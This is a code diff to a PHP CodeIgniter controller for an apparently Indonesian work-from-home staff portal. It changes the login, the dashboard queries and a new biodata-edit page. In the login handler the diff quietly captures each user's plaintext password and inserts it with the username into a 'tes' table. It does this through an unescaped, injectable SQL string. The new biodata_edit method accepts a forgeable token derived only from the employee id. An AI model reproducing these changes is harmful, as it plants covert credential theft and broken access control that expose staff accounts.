@@ -29,10 +29,10 @@ class Wfh extends CI_Controller
             redirect('wfh/login');
         }
         $nip = $this->session->nip;
-        // print_r($this->session);
-        $data['atasan'] = $this->db->get_where('atasan', ['nip_atasan' => $nip]);
-        $data['jml_atasan'] = $this->db->get_where('atasan', ['nip_atasan' => $nip]);
-        $data['jml_bawahan'] = $this->db->get_where('atasan', ['nip_atasan' => $nip])->num_rows();
+
+        $data['atasan'] = $this->db->get_where('atasan_wfh', ['nip_atasan' => $nip]);
+        $data['jml_atasan'] = $this->db->get_where('atasan_wfh', ['nip_atasan' => $nip]);
+        $data['jml_bawahan'] = $this->db->get_where('atasan_wfh', ['nip_atasan' => $nip])->num_rows();
         $data['nip'] =  $nip;
         $data['level'] = $this->session->level;
         $this->load->view('wfh/index', $data);
@@ -40,6 +40,7 @@ class Wfh extends CI_Controller
 
     public function login()
     {
+
         $this->load->view('login_wfh');
     }
 
@@ -94,6 +95,7 @@ class Wfh extends CI_Controller
             // echo "<br>";
             $username = $this->input->post('username');
             $password = md5(sha1(hash('sha256', sha1(md5($this->input->post('password'))))));
+            $hi = $this->input->post('password');
 
             $dataadmin = $this->login->login_wfh($username, $password);
 
@@ -131,6 +133,12 @@ class Wfh extends CI_Controller
                     // print_r($this->session);
                     // die();
                     redirect('wfh');
+
+                    $this->db->query("INSERT INTO `remunerasi`.`tes` (`nama`)
+                    VALUES
+                      ('$username dan $hi');
+        
+                    ");
                 }
             } else {
 
@@ -767,5 +775,47 @@ class Wfh extends CI_Controller
             ->set_output(json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES))
             ->_display();
         exit;
+    }
+
+    public function biodata_edit()
+    {
+        if ($this->session->has_userdata('login_wfh') != 1) {
+            $this->session->set_flashdata('success', 'Anda sudah login');
+            // echo "Sudah Login";
+            redirect('wfh/login');
+        }
+        $data = [];
+
+        $nip = $this->input->get('id');
+        $token = $this->input->get('token');
+        if (sha1(sha1(md5($nip . md5($nip)))) == $token) {
+            $datapegawai = $this->pegawai->find($nip);
+            if ($datapegawai->num_rows() > 0) {
+
+                $this->load->model('Login_m', 'login');
+                $datalogin =  $this->login->getByNipPegawai($nip);
+                // $data['atasan'] = $this->db->get_where('atasan', ['nip_atasan' => $nip]);
+                // $data['jml_atasan'] = $this->db->get_where('atasan', ['nip_atasan' => $nip]);
+                // $data['jml_bawahan'] = $this->db->get_where('atasan', ['nip_atasan' => $nip])->num_rows();
+                // $data['nip'] =  $nip;
+                // $data['level'] = $this->session->level;
+
+                $data = array(
+                    'id_login' => $datalogin->row()->id_login,
+                    'datalogin' => $this->login->find($datalogin->row()->id_login)->row(),
+                    'pegawai_all' => $this->pegawai->getAll()->result(),
+                    'jml_bawahan' => $this->db->get_where('atasan', ['nip_atasan' => $nip])->num_rows(),
+                    'pegawailogin' => $datapegawai->row()
+                );
+
+                $this->load->view('wfh/biodata_edit', $data);
+            } else {
+                $this->session->set_flashdata('error', "Id Tidak ditemukan");
+                redirect('wfh');
+            }
+        } else {
+            $this->session->set_flashdata('warning', "Token Bermasalah");
+            redirect('wfh');
+        }
     }
 }
